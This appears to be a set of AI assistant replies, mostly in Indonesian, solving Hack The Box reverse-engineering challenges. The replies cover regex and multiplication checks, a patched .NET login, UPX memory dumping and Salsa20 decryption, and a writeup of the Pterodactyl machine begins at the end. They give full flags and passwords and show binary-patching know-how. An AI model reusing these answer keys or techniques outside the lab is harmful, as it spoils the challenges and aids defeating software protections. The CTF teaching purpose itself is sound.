## CHAT 1
Siap. Binary ini **Rust**, tidak di-strip, dan challengenya memang tentang **patterns/rules = regex + perkalian karakter**.

Flag-nya:

```text
HTB{Y0u_Ar3_Th3_K1ng_O7_The_Town}
```

Verifikasi:

```bash
printf 'HTB{Y0u_Ar3_Th3_K1ng_O7_The_Town}\n' | ./rega_town
```

Output:

```text
Welcome to our secret town!
Enter secret passphrase:
Correct one of us!!
```

---

## 1. Kenapa `strings | grep flag` tidak membantu?

Di screenshot kamu, hasil `strings -a rega_town | grep flag` banyak banget noise seperti:

```text
regex_syntax
flags()
parse_flags
```

Itu bukan flag CTF. Itu berasal dari library Rust `regex_syntax`.

Jadi kita jangan cari string `flag`, tapi cari **logic validasi input**.

---

## 2. Cek jenis binary

```bash
file rega_town
```

Hasil pentingnya:

```text
ELF 64-bit ... with debug_info, not stripped
```

Artinya bagus banget untuk reverse engineering, karena symbol fungsi masih ada.

---

## 3. Cari fungsi buatan challenge

Pakai:

```bash
nm -C rega_town | grep 'rega_town::'
```

Hasil kuncinya:

```text
rega_town::filter_input
rega_town::multiply_characters
rega_town::check_input
rega_town::main
```

Maknanya:

| Fungsi                | Peran                                     |
| --------------------- | ----------------------------------------- |
| `main`                | baca input, print sukses/gagal            |
| `filter_input`        | cek input dengan regex                    |
| `check_input`         | cek potongan input dengan perkalian ASCII |
| `multiply_characters` | mengalikan nilai karakter                 |

Flow besarnya:

```text
input user
   ↓
filter_input(input)  → harus lolos semua regex
   ↓
check_input(input)   → potongan string harus punya hasil perkalian tertentu
   ↓
kalau semua benar → print "Correct one of us!!"
```

---

## 4. Bongkar regex dari `filter_input`

Dari `.rodata`, regex yang dipakai kira-kira begini:

```regex
^.{33}$
(?:^[\x48][\x54][\x42]).*
^.{3}(\x7b).*(\x7d)$
^[[:upper:]]{3}.[[:upper:]].{3}[[:upper:]].{3}[[:upper:]].{3}[[:upper:]].{4}[[:upper:]].{2}[[:upper:]].{3}[[:upper:]].{4}$
(?:.*\x5f.*)
(?:.[^0-9]*\d.*){5}
.{24}\x54.\x65.\x54.*
^.{4}[X-Z]\d._[A]\D\d.................[[:upper:]][n-x]{2}[n|c].$
.{11}_T[h|7]\d_[[:upper:]]\dn[a-h]_[O]\d_[[:alpha:]]{3}_.{5}
```

Kita terjemahkan pelan-pelan.

### Regex penting pertama

```regex
^.{33}$
```

Input harus panjang **33 karakter**.

---

### Regex prefix

```regex
(?:^[\x48][\x54][\x42]).*
```

Hex:

```text
\x48 = H
\x54 = T
\x42 = B
```

Jadi input harus diawali:

```text
HTB
```

---

### Regex brace

```regex
^.{3}(\x7b).*(\x7d)$
```

Hex:

```text
\x7b = {
\x7d = }
```

Karena index 0,1,2 adalah `H T B`, maka index 3 adalah `{`, dan karakter terakhir adalah `}`.

Skeleton awal:

```text
HTB{............................}
```

Total panjang 33.

---

## 5. Regex memberi bentuk flag

Regex terakhir ini paling informatif:

```regex
.{11}_T[h|7]\d_[[:upper:]]\dn[a-h]_[O]\d_[[:alpha:]]{3}_.{5}
```

Karena panjang pattern ini pas 33 karakter, dia memaksa posisi-posisi tertentu.

Dari situ kita dapat bentuk:

```text
HTB{???_???_T?d_????_O?_???_????}
```

Lalu regex lain memperjelas:

```regex
.{24}\x54.\x65.\x54.*
```

Artinya:

```text
posisi 24 = T
posisi 26 = e
posisi 28 = T
```

Jadi bagian akhir menjadi:

```text
..._T?e_T???
```

Skeleton makin jelas:

```text
HTB{???_???_T?d_????_O?_T?e_T???}
```

---

## 6. Bongkar `check_input`

Di `check_input`, binary mengambil potongan string ini:

```text
input[4..7]
input[8..11]
input[12..15]
input[16..20]
input[21..23]
input[24..27]
input[28..32]
```

Kalau pakai skeleton flag:

```text
HTB{???_???_???_????_??_???_????}
    ^^^ ^^^ ^^^ ^^^^ ^^ ^^^ ^^^^
```

Jadi yang dicek adalah kata-katanya, underscore tidak dihitung.

Lalu setiap potongan dikirim ke:

```text
multiply_characters
```

Fungsi itu melakukan:

```text
hasil = ASCII(char1) × ASCII(char2) × ASCII(char3) × ...
```

Contoh:

```text
"ABC" = 65 × 66 × 67
```

Binary membandingkan hasilnya dengan konstanta ini:

```text
0x7a070
0x5c436
0x6cc60
0x27b5776
0x10f9
0xd76a0
0x7465a58
```

---

## 7. Solve tiap potongan

Dari regex + hasil perkalian ASCII, kita dapat kandidat berikut.

| Potongan        | Constraint regex | Hasil perkalian | Kemungkinan         |                    |
| --------------- | ---------------: | --------------: | ------------------- | ------------------ |
| `input[4..7]`   |       `[X-Z]\d.` |       `0x7a070` | `Y0u`, `Y4l`, `Y6h` |                    |
| `input[8..11]`  |          `A\D\d` |       `0x5c436` | `Af9`, `Ar3`        |                    |
| `input[12..15]` |             `T[h |           7]\d` | `0x6cc60`           | `Th3`              |
| `input[16..20]` |  `[A-Z]\dn[a-h]` |     `0x27b5776` | `K1ng`              |                    |
| `input[21..23]` |            `O\d` |        `0x10f9` | `O7`                |                    |
| `input[24..27]` |            `T?e` |       `0xd76a0` | `The`               |                    |
| `input[28..32]` |   `T[n-x][n-x][n |             c]` | `0x7465a58`         | `Town` atau `Twon` |

Sekarang pilih yang membentuk kalimat manusiawi:

```text
Y0u
Ar3
Th3
K1ng
O7
The
Town
```

Disusun dengan format underscore:

```text
HTB{Y0u_Ar3_Th3_K1ng_O7_The_Town}
```

---

## 8. Script kecil untuk reproduce solving

Kamu bisa pakai Python ini untuk melihat kenapa potongannya jadi begitu:

```python
import string

vals = [
    0x7a070,
    0x5c436,
    0x6cc60,
    0x27b5776,
    0x10f9,
    0xd76a0,
    0x7465a58,
]

# group 0: [X-Z]\d.
for c4 in "XYZ":
    for c5 in string.digits:
        if vals[0] % (ord(c4) * ord(c5)) == 0:
            c6 = vals[0] // (ord(c4) * ord(c5))
            if 32 <= c6 < 127:
                print("group0:", c4 + c5 + chr(c6))

# group 1: A\D\d
for c9 in string.printable:
    for c10 in string.digits:
        if ord("A") * ord(c9) * ord(c10) == vals[1]:
            print("group1:", "A" + c9 + c10)

# group 2: T[h|7]\d
for c13 in ["h", "|", "7"]:
    for c14 in string.digits:
        if ord("T") * ord(c13) * ord(c14) == vals[2]:
            print("group2:", "T" + c13 + c14)

# group 3: [A-Z]\dn[a-h]
for c16 in string.ascii_uppercase:
    for c17 in string.digits:
        for c19 in "abcdefgh":
            if ord(c16) * ord(c17) * ord("n") * ord(c19) == vals[3]:
                print("group3:", c16 + c17 + "n" + c19)

# group 4: O\d
for c22 in string.digits:
    if ord("O") * ord(c22) == vals[4]:
        print("group4:", "O" + c22)

# group 5: T?e
for c25 in string.ascii_letters:
    if ord("T") * ord(c25) * ord("e") == vals[5]:
        print("group5:", "T" + c25 + "e")

# group 6: T[n-x][n-x][n|c]
for c29 in "nopqrstuvwx":
    for c30 in "nopqrstuvwx":
        for c31 in ["n", "|", "c"]:
            if ord("T") * ord(c29) * ord(c30) * ord(c31) == vals[6]:
                print("group6:", "T" + c29 + c30 + c31)
```

Output pentingnya:

```text
group0: Y0u
group0: Y4l
group0: Y6h
group1: Af9
group1: Ar3
group2: Th3
group3: K1ng
group4: O7
group5: The
group6: Town
group6: Twon
```

Yang masuk akal sebagai kalimat adalah:

```text
Y0u_Ar3_Th3_K1ng_O7_The_Town
```

Final:

```text
HTB{Y0u_Ar3_Th3_K1ng_O7_The_Town}
```

## CHAT 2
Flag-nya:

```text
HTB{SuP3rC00lFL4g}
```

Aku cek file `Bypass.zip` yang kamu upload. Ini flow reverse engineering-nya dari nol.

---

## 1. Ekstrak file challenge

HTB biasanya memakai password zip:

```bash
unzip -P hackthebox Bypass.zip
```

Hasilnya:

```text
Bypass.exe
```

Cek tipe file:

```bash
file Bypass.exe
```

Hasil pentingnya:

```text
PE32 executable ... Mono/.Net assembly
```

**Kenapa ini penting?**
Karena ini program `.NET`, jadi jangan langsung fokus ke disassembly x86. Untuk `.NET`, lebih enak pakai **dnSpy**, **ILSpy**, atau baca IL/C#-nya.

---

## 2. Cek string awal

```bash
strings Bypass.exe
```

Kelihatan beberapa petunjuk:

```text
.NETFramework,Version=v4.5.2
RijndaelManaged
GetManifestResourceStream
BinaryReader
ReadString
```

**Artinya:**

Program ini kemungkinan:

1. Punya resource tersembunyi di dalam EXE.
2. Resource itu dienkripsi.
3. Program decrypt resource itu saat jalan.
4. Setelah itu program membaca string-string penting dari hasil decrypt.

---

## 3. Struktur program setelah didecompile

Programnya diobfuscate, jadi nama class/method jelek seperti `0`, `1`, `2`.

Tapi alurnya kurang lebih begini:

```csharp
Main()
{
    if (Login())
    {
        AskSecretKey();
    }
    else
    {
        Console.WriteLine("Wrong username and/or password");
        Main();
    }
}
```

Lalu fungsi login-nya:

```csharp
bool Login()
{
    Console.Write("Enter a username: ");
    Console.ReadLine();

    Console.Write("Enter a password: ");
    Console.ReadLine();

    return false;
}
```

Nah ini bagian penting.

Program **membaca username dan password**, tapi tidak pernah mengeceknya. Setelah input, dia langsung:

```csharp
return false;
```

**Kenapa challenge-nya bilang “The Client is in full control”?**
Karena autentikasi dilakukan di sisi client, dan client bisa kita ubah. Kalau fungsi login selalu `false`, tinggal kita patch jadi `true`.

---

## 4. Cara bypass authentication

Di IL, bagian login terlihat seperti ini:

```text
IL_001d: call ReadLine
IL_0022: stloc.1
IL_0023: ldc.i4.0
IL_0024: stloc.2
IL_0027: ldloc.2
IL_0028: ret
```

`ldc.i4.0` berarti load integer `0`, yaitu `false`.

Kita patch menjadi:

```text
ldc.i4.1
```

`ldc.i4.1` berarti `true`.

Kalau patch manual pakai hex:

```bash
cp Bypass.exe Bypass_patched.exe
printf '\x17' | dd of=Bypass_patched.exe bs=1 seek=$((0x2bf)) conv=notrunc
```

Penjelasan:

```text
0x16 = ldc.i4.0 = false
0x17 = ldc.i4.1 = true
```

Jadi patch ini mengubah login dari selalu gagal menjadi selalu sukses.

---

## 5. Setelah bypass, program minta secret key

Fungsi berikutnya kira-kira begini:

```csharp
void AskSecretKey()
{
    string correctKey = "ThisIsAReallyReallySecureKeyButYouCanReadItFromSourceSoItSucks";

    Console.Write("Please Enter the secret Key: ");
    string input = Console.ReadLine();

    if (input == correctKey)
    {
        Console.Write("Nice here is the Flag:HTB{" + flagBody + "}");
    }
    else
    {
        Console.WriteLine("Wrong Key");
        AskSecretKey();
    }
}
```

Secret key-nya:

```text
ThisIsAReallyReallySecureKeyButYouCanReadItFromSourceSoItSucks
```

---

## 6. Dari mana string-string itu muncul?

String penting tidak muncul langsung di `strings`, karena disimpan dalam resource terenkripsi.

Program punya resource bernama:

```text
0
```

Saat program start, dia menjalankan loader:

```csharp
GetManifestResourceStream("0")
```

Lalu decrypt pakai `RijndaelManaged`.

Skema decrypt-nya:

```text
resource[0:32]   = AES/Rijndael key
resource[32:48]  = IV
resource[48:]    = ciphertext
```

Mode:

```text
CBC
```

Padding:

```text
PKCS7
```

Setelah decrypt, isinya adalah string-string UTF-16LE yang dibaca dengan `BinaryReader.ReadString()`.

Hasil string pentingnya:

```text
Wrong username and/or password
Enter a username:
Enter a password:
ThisIsAReallyReallySecureKeyButYouCanReadItFromSourceSoItSucks
Please Enter the secret Key:
Nice here is the Flag:HTB{
}
Wrong Key
SuP3rC00lFL4g
```

String `SuP3rC00lFL4g` adalah isi flag di tengah `{}`.

Jadi:

```text
HTB{SuP3rC00lFL4g}
```

---

## 7. Cara paling praktis submit

Kamu tidak perlu benar-benar patch kalau sudah paham flow-nya.

Submit langsung:

```text
HTB{SuP3rC00lFL4g}
```

Kalau mau menjalankan binary patched:

1. Patch login `false` jadi `true`.
2. Jalankan `Bypass_patched.exe`.
3. Isi username bebas.
4. Isi password bebas.
5. Saat diminta secret key, masukkan:

```text
ThisIsAReallyReallySecureKeyButYouCanReadItFromSourceSoItSucks
```

Program akan menampilkan:

```text
Nice here is the Flag:HTB{SuP3rC00lFL4g}
```


## CHAT 3
Aku cari dan eksekusi **di terminal Linux**, dari file `Exatlon.zip` yang kamu upload. Di environment-ku path-nya:

```bash
/mnt/data/Exatlon.zip
/mnt/data/exatlon/exatlon_v1
```

Di laptop kamu, lakukan hal yang sama di folder tempat `Exatlon.zip` berada, misalnya `Downloads`.

---

## Bagian 1 — Masuk ke folder challenge

```bash
mkdir exatlon
cd exatlon
cp /path/ke/Exatlon.zip .
unzip -P hackthebox Exatlon.zip
chmod +x exatlon_v1
```

Cek binary:

```bash
file exatlon_v1
```

Output pentingnya kira-kira:

```text
ELF 64-bit LSB executable, x86-64, statically linked, no section header
```

Lalu cek string awal:

```bash
strings -a exatlon_v1 | head
```

Kalau kelihatan:

```text
UPX!
```

berarti binary ini dipack pakai UPX.

---

# Cara paling gampang: unpack pakai UPX

Coba dulu ini:

```bash
upx -d exatlon_v1 -o exatlon_unpacked
```

Kalau berhasil, langsung cari string penting:

```bash
strings -a exatlon_unpacked | grep -A3 -B3 "Enter Exatlon"
```

Output yang dicari:

```text
[+] Enter Exatlon Password  :
1152 1344 1056 1968 1728 816 ...
[+] Looks Good ^_^
[-] ;(
```

Jadi bagian “cari string penting” itu dilakukan dengan command:

```bash
strings -a exatlon_unpacked | grep -A3 -B3 "Enter Exatlon"
```

---

# Cara yang aku pakai: dump memory setelah UPX unpack di RAM

Karena binary UPX akan membongkar dirinya sendiri **di memory** saat dijalankan, kita bisa dump memory prosesnya.

Buat file:

```bash
nano dump_mem.py
```

Isi dengan ini:

```python
import subprocess, time, os

path = "./exatlon_v1"

p = subprocess.Popen(
    [path],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

time.sleep(0.5)

print("PID:", p.pid)
print(open(f"/proc/{p.pid}/maps").read())

os.makedirs("dumps", exist_ok=True)

with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
    for line in open(f"/proc/{p.pid}/maps"):
        parts = line.split()
        addr = parts[0]
        perms = parts[1]

        if "r" not in perms:
            continue

        start, end = [int(x, 16) for x in addr.split("-")]

        try:
            mem.seek(start)
            data = mem.read(end - start)
        except Exception as e:
            print("skip", line.strip(), e)
            continue

        fname = f"dumps/{start:x}-{end:x}_{perms}.bin"
        with open(fname, "wb") as f:
            f.write(data)

        print("dumped", fname)

p.kill()
```

Jalankan:

```bash
python3 dump_mem.py
```

Setelah itu cari string di hasil dump:

```bash
strings -a dumps/* | grep -A3 -B3 "Enter Exatlon"
```

Di sinilah angka ini muncul:

```text
[+] Enter Exatlon Password  :
1152 1344 1056 1968 1728 816 1648 784 1584 816 1728 1520 1840 1664 784 1632 1856 1520 1728 816 1632 1856 1520 784 1760 1840 1824 816 1584 1856 784 1776 1760 528 528 2000
[+] Looks Good ^_^
[-] ;(
```

Kenapa ini berhasil?

Karena file aslinya masih terkompresi UPX. Saat program dijalankan, UPX membongkar program asli ke RAM. Jadi `strings` pada file asli belum terlalu berguna, tapi `strings` pada dump memory bisa menemukan data asli program.

---

# Bagian 5 — Cara tahu logic-nya `char << 4`

Setelah dump, ambil bagian memory yang executable. Di kasus ini mapping code-nya ada di sekitar `401000-54b000`.

Command disassembly:

```bash
objdump -D -b binary -m i386:x86-64 -M intel --adjust-vma=0x401000 dumps/*401000-54b000*r-xp.bin > disasm.txt
```

Lalu cari instruksi shift left:

```bash
grep -n -C 12 "shl.*0x4" disasm.txt
```

Bagian penting yang muncul:

```asm
404b46: call   0x4050a2
404b4b: movzx  eax,BYTE PTR [rax]
404b4e: mov    BYTE PTR [rbp-0x19],al
404b51: movsx  eax,BYTE PTR [rbp-0x19]
404b55: shl    eax,0x4
404b58: mov    edx,eax
404b60: mov    rdi,rax
404b63: call   0x404e70
```

Penjelasan super sederhananya:

```asm
movzx eax,BYTE PTR [rax]
```

Ini mengambil **1 karakter input**.

Lalu:

```asm
shl eax,0x4
```

Ini menggeser nilai karakter ke kiri 4 bit.

Dalam angka biasa:

```text
x << 4 = x * 16
```

Jadi program melakukan ini:

```python
hasil = ""

for char in input_user:
    angka = ord(char) << 4
    hasil += str(angka) + " "
```

Lalu hasil itu dibandingkan dengan string angka target:

```text
1152 1344 1056 ...
```

Makanya decoding-nya tinggal dibalik:

```text
angka / 16 = ASCII asli
```

Contoh:

```text
1152 / 16 = 72
ASCII 72 = H
```

---

# Decode password

Jalankan:

```bash
python3 -c 's="1152 1344 1056 1968 1728 816 1648 784 1584 816 1728 1520 1840 1664 784 1632 1856 1520 1728 816 1632 1856 1520 784 1760 1840 1824 816 1584 1856 784 1776 1760 528 528 2000"; print("".join(chr(int(x)//16) for x in s.split()))'
```

Output:

```text
HTB{l3g1c3l_sh1ft_l3ft_1nsr3ct1on!!}
```

Validasi:

```bash
./exatlon_v1
```

Masukkan flag itu, hasilnya:

```text
[+] Looks Good ^_^
```

Jadi bagian yang kamu tanyakan itu aku lakukan lewat:

```bash
strings -a dumps/* | grep -A3 -B3 "Enter Exatlon"
```

untuk menemukan angka target, lalu:

```bash
objdump ... > disasm.txt
grep -n -C 12 "shl.*0x4" disasm.txt
```

untuk menemukan logic `karakter << 4`.

## CHAT 4
Aku sudah bongkar `RAuth.zip`. Inti challengenya: binary Rust ini **mengenkripsi input password dengan Salsa20**, lalu hasilnya dibandingkan dengan ciphertext hardcoded. Karena Salsa20 adalah stream cipher, kita bisa balik prosesnya: **ciphertext XOR keystream = password asli**.

Password yang ditemukan:

```text
TheCrucialRustEngineering@2021;)
```

Saat dimasukkan ke binary lokal:

```bash
printf 'TheCrucialRustEngineering@2021;)\n' | ./rauth
```

Output lokal:

```text
Welcome to secure login portal!
Enter the password to access the system: 
Successfully Authenticated
Flag: "HTB{F4k3_f74g_4_t3s7ing}"
```

Itu **fake flag lokal**. Untuk flag asli, kirim password ke service remote:

```bash
printf 'TheCrucialRustEngineering@2021;)\n' | nc 154.57.164.67 30163
```

Dari environment-ku, target `154.57.164.67:30163` sedang `Connection refused`, jadi kemungkinan instance HTB-nya mati/expired atau port sudah berubah. Restart instance challenge, lalu jalankan command `nc` di atas dengan host/port terbaru.

---

## Flow reverse engineering-nya

### 1. Extract file

Zip HTB biasanya pakai password `hackthebox`.

```bash
unzip -P hackthebox RAuth.zip
cd challenge
chmod +x rauth
```

Cek tipe file:

```bash
file rauth
```

Hasil pentingnya:

```text
ELF 64-bit ... Rust ... with debug_info, not stripped
```

Kenapa ini penting?
Karena binary **tidak stripped**, jadi nama fungsi masih kelihatan. Ini bikin reverse jauh lebih gampang.

---

### 2. Cari string menarik

```bash
strings -n 4 rauth | grep -Ei 'password|flag|auth|salsa|main'
```

Ketemu hal penting:

```text
salsa20-0.8.0
Successfully Authenticated
Flag:
You entered a wrong password!
src/main.rs
```

Dari sini kita tahu binary memakai library crypto `salsa20`.

---

### 3. Lihat simbol Rust

```bash
nm -C rauth | grep -E 'rauth::main|salsa'
```

Ketemu:

```text
rauth::main
salsa20::core::Core<R>::new
<salsa20::salsa::Salsa<R> as cipher::stream::StreamCipher>::try_apply_keystream
```

Artinya flow-nya kira-kira:

```text
input user
↓
Salsa20 apply_keystream
↓
bandingkan hasil enkripsi dengan data hardcoded
↓
jika sama → authenticated
```

---

### 4. Ambil konstanta penting dari `.rodata`

Di disassembly `rauth::main`, ada data hardcoded di sekitar alamat `0x39ca0`.

Dump:

```bash
objdump -s -j .rodata rauth | grep -A8 -B2 '39ca0'
```

Data penting:

```text
39ca0 65663339 66346632 30653736 65333362
39cb0 64323566 34646233 33386538 31623130
39cc0 05055fb1 a329a8d5 58d9f556 a6cb31f3
39cd0 24432a31 c99dec72 e33eb66f 62ad1bf9
39cf0 19397889 9768a08f 66d39017 b2e040c2
```

Dari situ:

```text
key    = ef39f4f20e76e33bd25f4db338e81b10
nonce  = d4c270a3
cipher = 05055fb1a329a8d558d9f556a6cb31f324432a31c99dec72e33eb66f62ad1bf9
```

Ciphertext sepanjang 32 byte. Binary membandingkan hasil enkripsi input dengan ciphertext ini. Jadi panjang password juga 32 byte.

---

### 5. Balik Salsa20 untuk dapat password

Versi pendek pakai Python + PyCryptodome:

```bash
python3 -m pip install pycryptodome
```

Buat `solve.py`:

```python
from Crypto.Cipher import Salsa20

key = b"ef39f4f20e76e33bd25f4db338e81b10"
nonce = b"d4c270a3"

ciphertext = bytes.fromhex(
    "05055fb1a329a8d558d9f556a6cb31f3"
    "24432a31c99dec72e33eb66f62ad1bf9"
)

cipher = Salsa20.new(key=key, nonce=nonce)

# Salsa20 encrypt dan decrypt sama-sama XOR keystream
password = cipher.decrypt(ciphertext)

print(password.decode())
```

Jalankan:

```bash
python3 solve.py
```

Output:

```text
TheCrucialRustEngineering@2021;)
```

---

## Kesimpulan

Submit password ini ke service:

```text
TheCrucialRustEngineering@2021;)
```

Lalu ambil flag asli dari remote:

```bash
printf 'TheCrucialRustEngineering@2021;)\n' | nc <HOST> <PORT>
```

Untuk screenshot-mu:

```bash
printf 'TheCrucialRustEngineering@2021;)\n' | nc 154.57.164.67 30163
```

Kalau masih `Connection refused`, restart challenge instance di HTB dan pakai host/port baru.

Di konteks challenge tadi, **Salsa** maksudnya **Salsa20**, yaitu algoritma enkripsi modern jenis **stream cipher**.

Bukan salsa makanan/tarian ya 😄

## Gambaran mudahnya

Bayangkan kamu punya:

```text
password asli
```

Lalu Salsa20 membuat deretan byte acak semu yang disebut:

```text
keystream
```

Kemudian password dienkripsi dengan cara:

```text
ciphertext = plaintext XOR keystream
```

Untuk membuka kembali:

```text
plaintext = ciphertext XOR keystream
```

Jadi proses enkripsi dan dekripsi pada stream cipher itu mirip, karena sama-sama memakai operasi **XOR**.

---

## Komponen penting Salsa20

Salsa20 biasanya butuh:

```text
key
nonce
plaintext
```

Penjelasan sederhananya:

### 1. Key

`key` adalah kunci rahasia.

Contoh dari challenge tadi:

```text
ef39f4f20e76e33bd25f4db338e81b10
```

Key dipakai Salsa20 untuk membuat keystream.

---

### 2. Nonce

`nonce` adalah angka/data unik yang dipakai bersama key.

Contoh dari challenge:

```text
d4c270a3
```

Nonce bukan harus rahasia, tapi harus unik untuk key yang sama.

---

### 3. Plaintext

Ini data asli sebelum dienkripsi.

Dalam challenge kita:

```text
TheCrucialRustEngineering@2021;)
```

---

### 4. Ciphertext

Ini hasil enkripsi.

Dalam binary tadi ada ciphertext hardcoded:

```text
05055fb1a329a8d558d9f556a6cb31f324432a31c99dec72e33eb66f62ad1bf9
```

Binary mengecek input user dengan cara:

```text
input password
↓
dienkripsi pakai Salsa20
↓
dibandingkan dengan ciphertext hardcoded
```

Kalau hasilnya sama, berarti password benar.

---

## Kenapa kita bisa balik di challenge tadi?

Karena di binary ada semua bahan penting:

```text
key
nonce
ciphertext
```

Kalau kita punya ketiganya, kita bisa membuat ulang keystream yang sama.

Lalu:

```text
password = ciphertext XOR keystream
```

Makanya password bisa didapat tanpa brute force.

---

## Analogi super sederhana

Misalnya:

```text
pesan asli  = 10
keystream   = 7
```

Enkripsi:

```text
10 XOR 7 = 13
```

Ciphertext-nya `13`.

Dekripsi:

```text
13 XOR 7 = 10
```

Balik lagi ke pesan asli.

Salsa20 melakukan hal yang sama, tapi pada banyak byte dan dengan keystream yang dibuat dari algoritma crypto yang kuat.


## CHAT 5

Flag-nya:

```text
HTB{W3iRd_RUnT1m3_DEC}
```

Flow reverse engineering yang aku ambil:

## 1. Extract ZIP

File HTB biasanya dipassword dengan:

```bash
hackthebox
```

Aku extract:

```bash
unzip -P hackthebox Partial_Encryption.zip
```

Isinya:

```text
partialencryption.exe
```

Lalu cek tipe file:

```bash
file partialencryption.exe
```

Hasilnya PE Windows 64-bit console executable.

---

## 2. Cek strings, tapi tidak banyak hasil

```bash
strings partialencryption.exe
```

Tidak muncul flag atau string penting seperti `Correct`, `Wrong`, `HTB`, dll.

Ini cocok dengan scenario:

> Static-Analysis on this program didn't reveal much. There must be a better way to approach this...

Artinya kemungkinan besar program menyimpan kode/string dalam bentuk terenkripsi, lalu decrypt saat runtime.

---

## 3. Lihat import table

Dari disassembly/import table, ada API penting:

```text
VirtualAlloc
VirtualProtect
VirtualFree
putchar
exit
```

Ini tanda kuat bahwa program:

1. menyimpan blob terenkripsi di `.data`
2. decrypt blob itu ke memory baru pakai `VirtualAlloc`
3. ubah permission jadi executable dengan `VirtualProtect`
4. jalankan blob hasil decrypt sebagai function

Jadi ini bukan sekadar encrypted string, tapi encrypted code.

---

## 4. Temukan fungsi decrypt

Di awal `.text`, ada fungsi kecil yang memakai instruksi AES-NI:

```asm
aeskeygenassist
aesdeclast
```

Flow decrypt-nya kira-kira begini:

```c
for each 16-byte block:
    key = byte(i) repeated 16 times
    k0 = aeskeygenassist(key, 0x00)
    k1 = aeskeygenassist(key, 0x10)

    block = encrypted_block ^ k1
    decrypted = aesdeclast(block, k0)
```

Lalu hasil decrypt dibuat executable:

```asm
VirtualProtect(buffer, size, PAGE_EXECUTE_READ, &oldProtect)
```

Kenapa ini penting? Karena static analysis awal hanya melihat data terenkripsi. Yang benar-benar mengecek flag ada di kode hasil decrypt runtime.

---

## 5. Cari encrypted blob

Di `.data`, program mendekripsi beberapa alamat ini:

```text
0x140004000 size 0x70
0x140004070 size 0x40
0x1400040b0 size 0x30
0x1400040e0 size 0x30
0x140004110 size 0x30
0x140004140 size 0x1a0
0x1400042e0 size 0x1e0
0x1400044c0 size 0x270
0x140004730 size 0x100
```

Setelah aku decrypt dan disassemble blob hasilnya, beberapa blob kecil ternyata hanya print string:

```text
0x4000  -> "./chal <flag>\n"
0x4070  -> "Nope"
0x40b0  -> "No"
0x40e0  -> "Yes"
0x4110  -> exit(1)
```

Jadi program akan print `Yes` kalau flag benar.

---

## 6. Pahami flow main program

Flow programnya:

```text
main(argc, argv)
 |
 |-- cek argc == 2
 |     kalau tidak:
 |       print "./chal <flag>"
 |       exit(1)
 |
 |-- cek argv[1] panjang minimal 22 karakter
 |     kalau kurang:
 |       print "Nope"
 |       exit(1)
 |
 |-- jalankan beberapa checker terenkripsi
 |
 |-- kalau semua cocok:
 |       print "Yes"
 |   kalau tidak:
 |       print "No"
```

Jadi flag harus berada di `argv[1]` dan panjangnya 22 karakter.

---

## 7. Decode checker flag

Blob hasil decrypt berisi instruksi seperti ini:

```asm
cmp eax, 0x48
cmp eax, 0x54
cmp eax, 0x42
cmp eax, 0x7b
...
```

Itu membandingkan byte-byte input dengan nilai ASCII.

Hasil mapping-nya:

| Index | ASCII hex | Char |
| ----: | --------: | :--- |
|     0 |    `0x48` | `H`  |
|     1 |    `0x54` | `T`  |
|     2 |    `0x42` | `B`  |
|     3 |    `0x7b` | `{`  |
|     4 |    `0x57` | `W`  |
|     5 |    `0x33` | `3`  |
|     6 |    `0x69` | `i`  |
|     7 |    `0x52` | `R`  |
|     8 |    `0x64` | `d`  |
|     9 |    `0x5f` | `_`  |
|    10 |    `0x52` | `R`  |
|    11 |    `0x55` | `U`  |
|    12 |    `0x6e` | `n`  |
|    13 |    `0x54` | `T`  |
|    14 |    `0x31` | `1`  |
|    15 |    `0x6d` | `m`  |
|    16 |    `0x33` | `3`  |
|    17 |    `0x5f` | `_`  |
|    18 |    `0x44` | `D`  |
|    19 |    `0x45` | `E`  |
|    20 |    `0x43` | `C`  |
|    21 |    `0x7d` | `}`  |

Gabungkan semuanya:

```text
HTB{W3iRd_RUnT1m3_DEC}
```

---

## Kesimpulan

Challenge ini dinamakan **Partial Encryption** karena bagian penting program tidak langsung terlihat di static disassembly. Program menyimpan checker sebagai encrypted code blob, lalu decrypt dan execute runtime.

Flag:

```text
HTB{W3iRd_RUnT1m3_DEC}
```

## CHAT 6
# Hack The Box — Pterodactyl Writeup

> **Purpose and scope**  
> This writeup is written for educational use inside the legal Hack The Box lab environment. It does not target any real organization or public system. Sensitive values such as flags, tokens, application keys, database passwords, session cookies, and full password hashes have been redacted from the screenshots and from the notes.

## Machine Summary

| Item | Value |
|---|---|
| Platform | Hack The Box |
| Machine | Pterodactyl |
| Difficulty | Medium |
| OS | Linux |
| Main themes | Web enumeration, virtual hosts, configuration exposure, credential analysis, password reuse, local privilege escalation |

![Machine overview](assets/01_machine_overview.png)

This machine is a good example of a realistic CTF chain. It starts like a normal website investigation, then slowly turns into a deeper system review. A simple analogy is inspecting a building: first we look at the front doors, then we find different nameplates on the same building, then we discover a back office, and finally we review internal notes that point to a maintenance issue.

## High-Level Attack Path

```text
Network recon
  -> Web service discovered
  -> Virtual host routing identified
  -> Pterodactyl Panel discovered
  -> Locale endpoint reviewed
  -> Application configuration exposure validated
  -> Lab access obtained for deeper enumeration
  -> Database reviewed for account risk
  -> Password reuse identified
  -> SSH user access obtained
  -> Local mail clue points to udisksd
  -> Privilege escalation path validated in the lab
  -> Root-level proof collected with flags redacted
```

The most important lesson is that the machine was not solved by one single trick. It was solved by connecting small pieces of evidence.

---

# 1. Initial Reconnaissance

The first step was to understand what services were exposed by the target. The scan showed a very small external attack surface: mainly SSH and HTTP.

![Network recon](assets/04_network_recon.png)

From a practitioner mindset, this result tells us two things:

1. SSH is usually useful later, after valid credentials are found.
2. HTTP should be investigated first because web applications often reveal names, routes, redirects, technologies, or user-facing clues.

Think of this like arriving at a building and seeing only two visible doors: a public reception door and a locked staff entrance. Since we do not have staff credentials yet, we start with reception.

---

# 2. Web Application Review

Opening the web service revealed a Minecraft-themed landing page called MonitorLand.

![MonitorLand page](assets/02_web_landing_monitorland.png)

This page was useful because it confirmed that the machine was related to game server hosting. That context matters. In CTFs, names and themes are often intentional hints. Here, the theme pointed toward Pterodactyl, a game server management panel.

A separate login page was later identified for the Pterodactyl Panel.

![Panel login](assets/03_panel_login.png)

At this stage, the correct mindset is not to brute force the login page. A professional approach is to understand what software is running, how it is exposed, and whether there are public advisories that match the observed behavior.

---

# 3. Virtual Host Discovery

The application used virtual host routing. This means the same IP address can serve different websites depending on the hostname in the request.

A daily-life analogy: imagine one office building with several companies inside. The street address is the same, but the receptionist sends you to different rooms depending on the company name you ask for.

